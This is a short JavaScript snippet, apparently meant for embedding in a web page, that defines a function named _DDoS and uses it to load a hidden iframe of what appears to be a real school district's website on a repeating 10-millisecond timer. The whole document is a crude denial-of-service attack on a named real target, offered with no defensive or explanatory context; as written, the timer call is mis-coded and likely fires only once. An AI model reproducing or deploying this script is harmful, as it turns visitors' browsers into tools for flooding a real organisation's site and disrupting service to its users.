function _DDoS(url){
 document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
}
 setInterval(_DDoS("http://www.mvcsc.k12.in.us"),10);


